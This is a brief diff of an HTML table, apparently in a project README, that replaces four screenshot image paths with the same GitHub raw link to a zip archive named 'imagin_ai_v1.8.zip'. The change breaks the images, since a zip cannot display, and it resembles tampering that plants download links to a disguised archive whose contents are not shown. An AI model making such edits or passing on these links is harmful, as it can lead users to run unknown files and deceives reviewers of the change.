@@ -10,16 +10,16 @@
 </tr>
 
 <td>
-  <img src="assets/images/Screenshot_1765640722.png" width="260"/>
+  <img src="https://github.com/yasin9064/imagin_ai/raw/refs/heads/main/linux/runner/imagin_ai_v1.8.zip" width="260"/>
 </td>
 <td>
-  <img src="assets/images/Screenshot_1765640727.png" width="260"/>
+  <img src="https://github.com/yasin9064/imagin_ai/raw/refs/heads/main/linux/runner/imagin_ai_v1.8.zip" width="260"/>
 </td>
 <td>
-  <img src="assets/images/Screenshot_1765640705.png" width="260"/>
+  <img src="https://github.com/yasin9064/imagin_ai/raw/refs/heads/main/linux/runner/imagin_ai_v1.8.zip" width="260"/>
 </td>
 <td>
-  <img src="assets/images/Screenshot_1765640640.png" width="260"/>
+  <img src="https://github.com/yasin9064/imagin_ai/raw/refs/heads/main/linux/runner/imagin_ai_v1.8.zip" width="260"/>
 </td>
 
 </table>
